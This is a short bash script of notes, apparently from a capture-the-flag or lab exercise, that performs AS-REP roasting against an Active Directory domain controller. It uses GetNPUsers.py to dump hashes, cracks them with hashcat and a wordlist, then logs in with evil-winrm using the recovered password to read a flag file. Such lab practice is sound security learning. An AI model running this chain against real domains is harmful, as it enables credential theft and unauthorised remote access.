#! /bin/bash

#https://www.pentestly.io/blog/how-to-attack-kerberos-101

# DONT_REQ_PREAUTH - DC will just send the hash to an unauthenticated user. AS-REP Roasting is looking to see if any known users happen to have this option set.

# look for vulnerable users
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175

cat hashes.aspreroast

hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
# returns Thestrokes23


# Win RM
gem install evil-winrm
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt

